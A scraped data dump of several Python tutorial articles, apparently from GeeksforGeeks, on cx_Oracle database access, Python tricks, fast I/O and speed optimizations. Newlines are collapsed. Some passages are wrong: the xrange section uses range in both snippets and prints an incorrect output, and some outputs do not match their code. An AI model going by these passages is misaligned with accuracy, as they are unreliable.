cursor:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cursor.close()\u00a0\u00a0\u00a0\u00a0if con:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0con.close()Output:\u00a0Table Created successfullyDDL statements don\u2019t require to be committed. They are automatically committed. In the above program, I have used execute() method to execute an SQL statement.2. Inserting a record into table using execute() methodPython3# importing moduleimport cx_Oracle\u00a0# Inserting a record into a table in Oracle databasetry:\u00a0\u00a0\u00a0\u00a0con = cx_Oracle.connect('tiger/scott@localhost:1521/xe')\u00a0\u00a0\u00a0\u00a0cursor = con.cursor()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0#con.autocommit = True\u00a0\u00a0\u00a0\u00a0# Inserting a record into table employee\u00a0\u00a0\u00a0\u00a0cursor.execute('insert into employee values(10001,\\'Rahul\\',50000.50)')\u00a0\u00a0\u00a0\u00a0\u00a0# commit() to make changes reflect in the database\u00a0\u00a0\u00a0\u00a0con.commit()\u00a0\u00a0\u00a0\u00a0print('Record inserted successfully')\u00a0except cx_Oracle.DatabaseError as e:\u00a0\u00a0\u00a0\u00a0print(\"There is a problem with Oracle\", e)\u00a0# by writing finally if any error occurs# then also we can close the all database operationfinally:\u00a0\u00a0\u00a0\u00a0if cursor:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cursor.close()\u00a0\u00a0\u00a0\u00a0if con:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0con.close()Output:\u00a0Record inserted successfullyOnce we execute any DML statement it is required to commit the transaction. You can commit a transaction in 2 ways: \u2013con.commit(). This is used to commit a transaction manually.con.autocommit = True. This is used to commit a transaction automatically.3. Inserting multiple records into a table using executemany() methodPython3import cx_Oracle\u00a0# Load data from a csv file into Oracle table using executemanytry:\u00a0\u00a0\u00a0\u00a0con = cx_Oracle.connect('tiger/scott@localhost:1521/xe')\u00a0except cx_Oracle.DatabaseError as er:\u00a0\u00a0\u00a0\u00a0print('There is an error in Oracle database:', er)\u00a0else:\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur = con.cursor()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0data = [[10007, 'Vikram', 48000.0], [10008, 'Sunil', 65000.1], [10009, 'Sameer', 75000.0]]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur = con.cursor()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Inserting multiple records into employee table\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# (:1,:2,:3) are place holders. They pick data from a list supplied as argument\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.executemany('insert into employee values(:1,:2,:3)', data)\u00a0\u00a0\u00a0\u00a0\u00a0except cx_Oracle.DatabaseError as er:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('There is an error in Oracle database:', er)\u00a0\u00a0\u00a0\u00a0\u00a0except Exception as er:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(er)\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# To commit the transaction manually\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0con.commit()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('Multiple records are inserted successfully')\u00a0finally:\u00a0\u00a0\u00a0\u00a0if cur:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.close()\u00a0\u00a0\u00a0\u00a0if con:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0con.close()Output: \u00a0Multiple records are inserted successfullyThere might be times when it is required to execute a SQL statement multiple times based on the different values supplied to it each time. This can be achieved using executemany() method. We supply a list containing a list of values that will replace placeholders in a SQL query to be executed.\u00a0From the above case:1 is substituted by value 10007:2 is substituted by value \u2018Vikram\u2019:3 is substituted by value 48000.0And so on(next list of values in a given list)Similarly, you can supply a list of dictionaries. But instead of placeholder, we will use the bind variable( discussed later).4. View result set from a select query using fetchall(), fetchmany(int), fetchone()Python3import cx_Oracle\u00a0try:\u00a0\u00a0\u00a0\u00a0con = cx_Oracle.connect('tiger/scott@localhost:1521/xe')\u00a0except cx_Oracle.DatabaseError as er:\u00a0\u00a0\u00a0\u00a0print('There is an error in the Oracle database:', er)\u00a0else:\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur = con.cursor()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# fetchall() is used to fetch all records from result set\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.execute('select * from employee')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0rows = cur.fetchall()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(rows)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# fetchmany(int) is used to fetch limited number of records from result set based on integer argument passed in it\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.execute('select * from employee')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0rows = cur.fetchmany(3)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(rows)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# fetchone() is used fetch one record from top of the result set\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.execute('select * from employee')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0rows = cur.fetchone()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(rows)\u00a0\u00a0\u00a0\u00a0\u00a0except cx_Oracle.DatabaseError as er:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('There is an error in the Oracle database:', er)\u00a0\u00a0\u00a0\u00a0\u00a0except Exception as er:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('Error:'+str(er))\u00a0\u00a0\u00a0\u00a0\u00a0finally:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if cur:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.close()\u00a0finally:\u00a0\u00a0\u00a0\u00a0if con:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0con.close()Output:[(10001, 'Rahul', 50000.5), (10002, 'Sanoj', 40000.75), (10003, 'Soumik', 30000.25), (10004, 'Sayan', 45000.0), (10005, 'Sobhan', 60000.1), (10006, 'Gururaj', 70000.0), (10007, 'Vikram', 48000.0), (10008, 'Sunil', 65000.1), (10009, 'Sameer', 75000.0)]\n[(10001, 'Rahul', 50000.5), (10002, 'Sanoj', 40000.75), (10003, 'Soumik', 30000.25)]\n(10001, 'Rahul', 50000.5)In the above program, we have used 3 methods\u00a0fetchall() : The fetchall() is used to fetch all records from the result set.fetchmany(int) : The\u00a0fetchmany(int) is used to fetch the limited number of records from the result set based on the integer argument passed in it.fetchone() : The\u00a0fetchone() is used to fetch one record from the top of the result set.5. View result set from a select query using bind variablePython3import cx_Oracle\u00a0try:\u00a0\u00a0\u00a0\u00a0con = cx_Oracle.connect('tiger/scott@localhost:1521/xe')\u00a0except cx_Oracle.DatabaseError as er:\u00a0\u00a0\u00a0\u00a0print('There is error in the Oracle database:', er)\u00a0else:\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur = con.cursor()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.execute('select * from employee where salary > :sal', {'sal': 50000})\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0rows = cur.fetchall()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(rows)\u00a0\u00a0\u00a0\u00a0\u00a0except cx_Oracle.DatabaseError as er:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('There is error in the Oracle database:', er)\u00a0\u00a0\u00a0\u00a0\u00a0except Exception as er:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('Error:', er)\u00a0\u00a0\u00a0\u00a0\u00a0finally:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if cur:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.close()\u00a0finally:\u00a0\u00a0\u00a0\u00a0if con:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0con.close()Output:[(10001, 'Rahul', 50000.5), (10005, 'Sobhan', 60000.1), (10006, 'Gururaj', 70000.0),\n (10008, 'Sunil', 65000.1), (10009, 'Sameer', 75000.0)]In this case, I have passed a dictionary in execute() method. This dictionary contains the name of the bind variable as a key, and it\u2019s corresponding value. When the SQL query is executed, value from the key is substituted in place of bind variable.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "ef206bbe95d4042467c97538df76db12",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python is one of the most preferred languages out there. Its brevity and high readability makes it so popular among all programmers.So here are few of the tips and tricks you can use to bring up your Python programming game.1. In-Place Swapping Of Two Numbers.x, y = 10, 20print(x, y)x, y = y, xprint(x, y)Output:\r\n10 20\r\n20 10\r\n2. Reversing a string in Pythona = \"GeeksForGeeks\"print(\"Reverse is\", a[::-1])Output:\r\nReverse is skeeGroFskeeG\r\n3. Create a single string from all the elements in lista = [\"Geeks\", \"For\", \"Geeks\"]print(\" \".join(a))Output:\r\nGeeks For Geeks\r\n4. Chaining Of Comparison Operators.n = 10result = 1 < n < 20print(result)result = 1 > n <= 9print(result)Output:\r\nTrue\r\nFalse\r\n4. Print The File Path Of Imported Modules.import osimport socket\u00a0\u00a0print(os)print(socket)Output:\r\n<module 'os' from '/usr/lib/python3.5/os.py'>\r\n<module 'socket' from '/usr/lib/python3.5/socket.py'>\r\n5. Use Of Enums In Python.class MyName:\u00a0\u00a0\u00a0\u00a0Geeks, For, Geeks = range(3)\u00a0\u00a0print(MyName.Geeks)print(MyName.For)print(MyName.Geeks)Output:\r\n2\r\n1\r\n2\r\n6. Return Multiple Values From Functions.def x():\u00a0\u00a0\u00a0\u00a0return 1, 2, 3, 4a, b, c, d = x()\u00a0\u00a0print(a, b, c, d)Output:\r\n1 2 3 4\r\n7. Find The Most Frequent Value In A List.test = [1, 2, 3, 4, 2, 2, 3, 1, 4, 4, 4]print(max(set(test), key = test.count))Output:\r\n4\r\n8. Check The Memory Usage Of An Object.import sysx = 1print(sys.getsizeof(x))Output:\r\n28\r\n9. Print string N times.n = 2a = \"GeeksforGeeks\"print(a * n)Output:\r\nGeeksforGeeksGeeksforGeeks\r\n10. Checking if two words are anagramsfrom collections import Counterdef is_anagram(str1, str2):\u00a0\u00a0\u00a0\u00a0\u00a0return Counter(str1) == Counter(str2)\u00a0\u00a0# or without having to import anything\u00a0def is_anagram(str1, str2):\u00a0\u00a0\u00a0\u00a0\u00a0return sorted(str1) == sorted(str2)\u00a0\u00a0\u00a0print(is_anagram('geek', 'eegk'))print(is_anagram('geek', 'peek'))\u00a0\u00a0\u00a0\u00a0Output:\r\nTrue\r\nFalse\r\nReferences:1.10 Neat Python Tricks Beginners Should Know2.30 Essential Python Tips And Tricks For ProgrammersMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "219609c65a004c2a46f047b0096dc63e",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python is indeed one of the smart and most trending languages. Here are some cool hacks that make python superb among all other languages.\u00a0List comprehensions: List comprehension is the best and efficient technique to get rid of writing unnecessary lines of code. Read Article to know more.\u00a0Printing a list: The list is not printed according to the user\u2019s requirement. They are always printed in unwanted square brackets and single quotes. But there is a trivial solution to print the list efficiently by using the string\u2019s join method.\u00a0The join method turns the list into a string by casting each item into a string and connecting them with the string that joins was called on.\u00a0Python# Declaring the list geekgeek = ['Geeks', 'Programming', 'Algorithm', 'Article']\u00a0\u00a0\u00a0# Directly printing the listprint (\"Simple List:\", geek)\u00a0\u00a0\u00a0# Printing the list by join methodprint ('List by using join method: %s' % ', ' .join(geek))\u00a0\u00a0\u00a0# Direct use of join methodprint ('Direct apply the join method:',(\", \" .join(geek)))Output: \nSimple List: ['Geeks', 'Programming', 'Algorithm', 'Article']\nList by using join method: Geeks, Programming, Algorithm, Article\nDirect apply the join method: Geeks, Programming, Algorithm, ArticleCool Zip tricksTranspose a matrix: You can Read Here about this.Partition a list into N groups: We used iter() as an iterator over a sequence.\u00a0Python3# Declaring the list geekgeek = ['Sun', 'Flowers', 'Peoples', 'Animals', 'Day', 'Night']\u00a0partition = list(zip (*[iter(geek)] * 2))print (partition)Output: \n[('Sun', 'Flowers'), ('Peoples', 'Animals'), ('Day', 'Night')]Explanation: [iter(geek)] * 2 produces a list containing 2 items of geek[] list, i.e. a list of length 2. *arg unpacks a sequence into arguments for a function call. Therefore we are passing the same iterator 2 times to zip().\u00a0Printing more than one list\u2019s items simultaneously\u00a0Pythonlist1 = [1, 3, 5, 7]list2 = [2, 4, 6, 8]\u00a0# Here zip() function takes two equal length list and merges them# together in pairsfor a, b in zip(list1,list2):\u00a0\u00a0\u00a0\u00a0print (a, b)Output: \n1 2\n3 4\n5 6\n7 8Take the string as input and convert it into the list:\u00a0Python3# Reads a string from input and type case them to int# after splitting to white-spaces\u00a0formatted_list = list(map(int, input().split()))print(formatted_list)Input:\n2 4 5 6\nOutput:\n[2, 4, 5, 6] Convert the list of list into a single list\u00a0Python3# import the itertoolsimport itertools\u00a0# Declaring the list geekgeek = [[1, 2], [3, 4], [5, 6]]\u00a0# chain.from_iterable() function returns the# elements of nested list# and iterate from first list# of iterable till the last# end of the list\u00a0lst = list(itertools.chain.from_iterable(geek))print(lst)Output: \n[1, 2, 3, 4, 5, 6]Printing the repeated characters: The task is to print the pattern like this Geeeeekkkkss. So we can easily print this pattern without using it for a loop.\u00a0Python# + used for string concatenation# To repeat the character n times, just multiply n\u00a0# with that character\u00a0\u00a0print (\"G\" + \"e\"*5 + \"k\"*4 + \"s\"*2)Output:\nGeeeeekkkkssRead More: 10 interesting facts about Python\u00a0Reference: https://www.quora.com/What-are-some-cool-Python-tricksThis article is contributed by Shubham Bansal. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "b4dc8194d91a385ebecd09f07ac99808",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python is an amazingly user-friendly language with the only flaw of being slow. In comparison to C, C++, and Java, it is quite slower. Online coding platforms, if C/C++ limit provided is X. Usually, in Java time provided is 2X and Python, it\u2019s 5X.To improve the speed of code execution for input/output intensive problems, languages have various input and output procedures.\u00a0An Example Problem :\u00a0Consider a question of finding the sum of N numbers inputted from the user.\u00a0Input a number N.\u00a0Input N numbers are separated by a single space in a line.\u00a0\u00a0Examples:\u00a0Input : \n5\n1 2 3 4 5\nOutput :\n15Different Python solutions for the above Problem :\u00a0Normal Method Python: (Python 2.7)\u00a01. raw_input() takes an optional prompt argument. It also strips the trailing newline character from the string it returns.\u00a02. print is just a thin wrapper that formats the inputs (space between args and newline at the end) and calls the write function of a given object.\u00a0\u00a0Python3# basic method of input output# input Nn = int(input())\u00a0# input the arrayarr = [int(x) for x in input().split()]\u00a0# initialize variablesummation = 0\u00a0# calculate sumfor x in arr:\u00a0\u00a0\u00a0\u00a0summation += x\u00a0\u00a0\u00a0\u00a0\u00a0# print answerprint(summation)A bit faster method using inbuilt stdin, stdout: (Python 2.7)\u00a01. sys.stdin on the other hand is a File Object. It is like creating any other file object one could create to read input from the file. In this case, the file will be a standard input buffer.\u00a02. stdout.write(\u2018D\\n\u2019) is faster than print \u2018D\u2019.\u00a03. Even faster is to write all once by stdout.write(\u201c\u201d.join(list-comprehension)) but this makes memory usage dependent on the size of the input.\u00a0\u00a0Python3# import inbuilt standard input outputfrom sys import stdin, stdout\u00a0# suppose a function called main() and# all the operations are performeddef main():\u00a0\u00a0\u00a0\u00a0\u00a0# input via readline method\u00a0\u00a0\u00a0\u00a0n = stdin.readline()\u00a0\u00a0\u00a0\u00a0\u00a0# array input similar method\u00a0\u00a0\u00a0\u00a0arr = [int(x) for x in stdin.readline().split()]\u00a0\u00a0\u00a0\u00a0\u00a0#initialize variable\u00a0\u00a0\u00a0\u00a0summation = 0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# calculate sum\u00a0\u00a0\u00a0\u00a0for x in arr:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0summation += x\u00a0\u00a0\u00a0\u00a0\u00a0# could use inbuilt summation = sum(arr)\u00a0\u00a0\u00a0\u00a0\u00a0# print answer via write\u00a0\u00a0\u00a0\u00a0# write method writes only\u00a0\u00a0\u00a0\u00a0# string operations\u00a0\u00a0\u00a0\u00a0# so we need to convert any\u00a0\u00a0\u00a0\u00a0# data into string for input\u00a0\u00a0\u00a0\u00a0stdout.write(str(summation))\u00a0# call the main methodif __name__ == \"__main__\":\u00a0\u00a0\u00a0\u00a0main()\u00a0\u00a0\u00a0The difference in time:\u00a0\u00a0Timing summary (100k lines each)\u00a0\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2013\u00a0Print : 6.040 s\u00a0Write to file : 0.122 s\u00a0Print with Stdout : 0.121 sAs we have seen till now that taking input from the standard system and giving output to the standard system is always a good idea to improve the efficiency of the code which is always a need in Competitive programming. But wait! would you like to write these long lines every time when you need them? Then, what\u2019s the benefit of using Python.\u00a0Let\u2019s discuss the solution to this problem. What we can do is let\u2019s create separate functions for taking inputs of various types and just call them whenever you need them.\u00a0\u00a0When you want to take input of particular integers of integers given in a single lineSuppose the input is of the following form\u00a0\u00a05 7 19 20and we want separate variables to reference them. what we want is:\u00a0\u00a0a = 5\nb = 7\nc = 19\nd = 20so, we can create a function named as get_ints() as follows:\u00a0\u00a0Python3import sysdef get_ints(): return map(int, sys.stdin.readline().strip().split())\u00a0a,b,c,d = get_ints()Now you don\u2019t have to write this line again and again. You just have to call the get_ints() function in order to take input in this form. In the function get_ints we are using the map function.When you want to take input of list of integers given in a single lineSuppose the input is of the following form\u00a01 2 3 4 5 6 7 8and we want that a single variable will hold the whole list of integers. What we want is :\u00a0\u00a0Arr = [1, 2, 3, 4, 5, 6, 7, 8]So, here we will create a function named get_list() as follows:\u00a0\u00a0Python3import sysdef get_ints(): return list(map(int, sys.stdin.readline().strip().split()))\u00a0Arr = get_ints()Now you don\u2019t have to write this line again and again. You just have to call the get_ints() function in order to take input in this form\u00a0When you want to take input of stringSuppose the input is of the following form\u00a0\u00a0GeeksforGeeks is the best platform to practice Coding.and we want that a single reference variable will hold this string. What we want is :\u00a0\u00a0string = \"GeeksforGeeks if the best platform to practice coding.\"So, here we will create a function named get_string() as follows:\u00a0Python3import sysdef get_string(): return sys.stdin.readline().strip()\u00a0string = get_string()Now you don\u2019t have to write this line again and again. You just have to call the get_string() function in order to take input in this formAdding a buffered pipe io: (Python 2.7)\u00a01. Simply, adding the buffered IO code before your submission code to make the output faster.\u00a02. The benefit of io.BytesIO objects is that they implement a common interface (commonly known as a \u2018file-like\u2019 object). BytesIO objects have an internal pointer and for every call to read(n) the pointer advances.\u00a03. The atexit module provides a simple interface to register functions to be called when a program closes down normally. The sys module also provides a hook, sys.exitfunc, but only one function can be registered there. The atexit registry can be used by multiple modules and libraries simultaneously.\u00a0\u00a0Python3# template begins#####################################\u00a0# import libraries for input/ output handling# on generic levelimport atexit, io, sys\u00a0# A stream implementation using an in-memory bytes# buffer. It inherits BufferedIOBase.buffer = io.BytesIO()sys.stdout = buffer\u00a0# print via here@atexit.registerdef write():\u00a0\u00a0\u00a0\u00a0sys.stdout.write(buffer.getvalue())\u00a0###################################### template ends\u00a0# normal method followed# input Nn = int(input())\u00a0# input the arrayarr = [int(x) for x in input().split()]\u00a0# initialize variablesummation = 0\u00a0# calculate sumfor x in arr:\u00a0\u00a0\u00a0\u00a0summation += x\u00a0# print answerprint(summation)While handling a large amount of data usually, the normal method fails to execute within the time limit. Method 2 helps in maintaining a large amount of I/O data. Method 3 is the fastest. Usually, handling of input data files greater than 2 or 3 MBs is helped via methods 2 and 3.Note: above mention codes are in Python 2.7, to use in Python 3.X versions. Simply replace the raw_input() with Python 3.X\u2019s input() syntax. Rest should work fine.References:\u00a01.More About Input in Python 2.7\u00a02.Output via sys library and other commands.\u00a03.Input via sys library and other commands.\u00a04. Python atexit Module docs.This article is contributed by Shubham Saxena. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "d59df19d719149bc7dce9a0e3f38b54b",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In this article, some interesting optimization tips for Faster Python Code are discussed. These techniques help to produce result faster in a python code.Use builtin functions and libraries: Builtin functions like map() are implemented in C code. So the interpreter doesn\u2019t have to execute the loop, this gives a considerable speedup.The map() function applies a function to every member of iterable and returns the result. If there are multiple arguments, map() returns a list consisting of tuples containing the corresponding items from all iterables.# Python program to illustrate library functions# save time while coding with the example of map()import time\u00a0\u00a0\u00a0# slower (Without map())start = time.clock()\u00a0s = 'geeks'U = []for c in s:\u00a0\u00a0\u00a0\u00a0U.append(c.upper())print (U)elapsed = time.clock()e1 = elapsed - startprint (\"Time spent in function is: \", e1)\u00a0\u00a0\u00a0# Faster (Uses builtin function map())s = 'geeks'start = time.clock()\u00a0U = map(str.upper, s)\u00a0print (U)elapsed = time.clock()e2 = elapsed - startprint (\"Time spent in builtin function is: \", e2)Output:\r\n['G', 'E', 'E', 'K', 'S']\r\nTime spent in function is:  0.0394747945637\r\n['G', 'E', 'E', 'K', 'S']\r\nTime spent in builtin function is:  0.0212335531192\r\n\r\nThe packages are platform-specific, which means that we need the appropriate package for the platform we\u2019re using. If we are doing string operation, consider using an existing module \u2018collections\u2019 like deque which is highly optimized for our purposes.# Python program to illustrate# importing list-like container with\u00a0# fast appends and pops on either endfrom collections import deques = 'geek'\u00a0\u00a0\u00a0# make a new dequed = deque(s)\u00a0\u00a0\u00a0# add a new entry to the right sided.append('y')\u00a0\u00a0\u00a0# add a new entry to the left sided.appendleft('h')\u00a0print (d)\u00a0\u00a0\u00a0d.pop() # return and remove the rightmost item\u00a0\u00a0\u00a0d.popleft() # return and remove the lefttmost item\u00a0\u00a0\u00a0# print list deque in reverseprint (list(reversed(d)))\u00a0Output:deque(['h', 'g', 'e', 'e', 'k', 'y'])\r\n['k', 'e', 'e', 'g']\r\n# importing iteration toolsimport itertoolsiter = itertools.permutations([1,2,3])print (list(iter))Output:\r\n[(1, 2, 3), (1, 3, 2), (2, 1, 3), (2, 3, 1), (3, 1, 2), (3, 2, 1)]\r\nUse keys for sorts: In Python, we should use the key argument to the built-in sort instead, which is a faster way to sort.# Python program to illustrate# using keys for sortingsomelist = [1, -3, 6, 11, 5]somelist.sort()print (somelist)\u00a0\u00a0s = 'geeks'# use sorted() if you don't want to sort in-place:s = sorted(s)print (s)Output:\r\n[-3, 1, 5, 6, 11]\r\n['e', 'e', 'g', 'k', 's']\r\nIn each case the list is sorted according to the index you select as part of the key argument. This approach works just as well with strings as it does with numbers.Optimizing loops: Write idiomatic code: This may sound counter-intuitive but writing idiomatic code will make your code faster in most cases. This is because Python was designed to have only one obvious/correct way to do a task.For example (String Concatenation):# Python program to illustrate using# optimized loops for faster coding\u00a0\u00a0# slow O(n^2) - ( Note: In latest implementations it is O(n) )s = 'hellogeeks'slist = ''for i in s:\u00a0\u00a0\u00a0\u00a0slist = slist + iprint (slist)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# string concatenation (idiomatic and fast O(n))st = 'hellogeeks'slist = ''.join([i for i in s])print (slist)\u00a0\u00a0# Better way to iterate a rangeevens = [ i for i in range(10) if i%2 == 0]print (evens)\u00a0\u00a0# Less fasteri = 0evens = []while i < 10:\u00a0\u00a0\u00a0\u00a0if i %2 == 0:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0evens.append(i)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0i += 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (evens)\u00a0\u00a0# slowv = 'for's = 'geeks ' + v + ' geeks'print (s)\u00a0\u00a0# fasts = 'geeks %s geeks' % vprint (s)\u00a0\u00a0\u00a0\u00a0Output:\r\nhellogeeks\r\n[0, 2, 4, 6, 8]\r\ngeeks for geeks\r\nEvery time running a loop to s(i), Python evaluates the method. However, if you place the evaluation in a variable, the value is already known and Python can perform tasks faster.Try multiple coding approaches: Using precisely the same coding approach every time we create an application will almost certainly result in some situations where the application runs slower than it might.For example (Initializing Dictionary Elements):# Python program to illustrate trying# multiple coding approaches\u00a0# for getting faster result# slowermydict = {'g':1,'e':1,'e':1,'k':1}word = 'geeksforgeeks'for w in word:\u00a0\u00a0\u00a0\u00a0if w not in mydict:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0mydict[w] = 0\u00a0\u00a0\u00a0\u00a0mydict[w] += 1print (mydict)\u00a0\u00a0# fastermydict = {'g':1,'e':1,'e':1,'k':1}word = 'geeksforgeeks'for w in word:\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0mydict[w] += 1\u00a0\u00a0\u00a0\u00a0except KeyError:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0mydict[w] = 1print (mydict)Output:\r\n{'e': 5, 'g': 3, 'f': 1, 'k': 3, 'o': 1, 's': 2, 'r': 1}\r\nThe output is the same in both cases. The only difference is how the output is obtained.Use xrange instead of range:range() \u2013 This returns a list of numbers created using range() function.xrange() \u2013 This function returns the generator object that can be used to display numbers only by looping. Only particular range is displayed on demand and hence called \u201clazy evaluation\u201d.# slowerx = [i for i in range(0,10,2)]print (x)\u00a0\u00a0# fasterx = [i for i in range(0,10,2)]print (x)Output:\r\n[1, 3, 5, 7, 9]\r\nThis could save you system memory because xrange() will only yield one integer element in a sequence at a time. Whereas range(), it gives you an entire list, which is unnecessary overhead for looping.Use Python multiple assignment to swap variables: This is elegant and faster in Python.# Python program to illustrate swapping# of a variable in one line\u00a0\u00a0\u00a0# slowerx = 2y = 5temp = xx = yy = tempprint (x,y)\u00a0\u00a0x,y = 3,5# fasterx, y = y, xprint (x,y)Output:\r\n5 2\r\n5 3\r\nUse local variable if possible: Python is faster retrieving a local variable than retrieving a global variable. That is, avoid the \u201cglobal\u201d keyword. So if you are going to access a method often (inside a loop) consider writing it to a variable.# Python program to illustrate trying# to use local variables to make code# run fasterclass Test:\u00a0\u00a0\u00a0\u00a0def func(self,x):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (x+x)\u00a0\u00a0# Declaring variable that assigns class method objectObj = Test()mytest = Obj.func # Declaring local variablen = 2for i in range(n):\u00a0\u00a0\u00a0\u00a0mytest(i) # faster than Obj.func(i)Output:\r\n0\r\n2\r\nReferences:StackOverflowPython.orgThis article is contributed by Afzal Ansari. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "c4048f9cf6cb490d5e93f395d7eb5f09",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
